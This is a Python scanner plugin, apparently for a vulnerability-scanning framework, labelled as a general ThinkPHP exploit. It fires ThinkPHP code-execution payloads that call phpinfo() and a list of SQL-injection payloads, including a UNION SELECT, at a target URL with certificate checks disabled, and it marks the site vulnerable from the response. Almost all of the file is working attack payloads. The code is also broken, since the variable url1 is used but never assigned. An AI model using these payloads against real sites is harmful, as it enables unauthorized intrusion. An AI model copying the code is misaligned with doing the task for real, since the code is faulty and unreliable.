#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/ZGwZcZ2c4NN0nUekR8dmGw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'thinkphp通用exp',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  payload1= ['/?s=index/\think\module/action/param1/${@phpinfo()}','/?s=index/\think\Module/Action/Param/${@phpinfo()}',]
  # url1 = url + target
  for target in payload1:
    try:
      res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
      if res.status_code == 200 and re.search(r'phpinfo()',res.text,re.S):
        # ret['huixian'] = res.text
        res.close()
        ret['url'] = url1
        ret['ifbug'] = True
        return ret
    except:
      pass
  payload2 = ["/index.php?s=/home/article/view_recent/name/1'","/index.php?s=/home/shopcart/getPricetotal/tag/1%27","/index.php?s=/home/shopcart/getpriceNum/id/1%27",\
  "/index.php?s=/home/user/cut/id/1%27","/index.php?s=/home/service/index/id/1%27","index.php?s=/home/pay/chongzhi/orderid/1%27",\
  "index.php?s=/home/pay/index/orderid/1%27","index.php?s=/home/order/complete/id/1%27","index.php?s=/home/order/complete/id/1%27",\
  "index.php?s=/home/order/detail/id/1%27","index.php?s=/home/order/cancel/id/1%27","index.php?s=/home/pay/index/orderid/1%27)%20UNION%20ALL%20SELECT%20md5(233)--+"]
  for target in payload2:
    try:
      res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
      if res.status_code == 200 and re.search(r'XPATH syntax error.*?',res.text,re.S):
        # ret['huixian'] = res.text
        res.close()
        ret['url'] = url1
        ret['ifbug'] = True
        return ret
    except:
      return ret

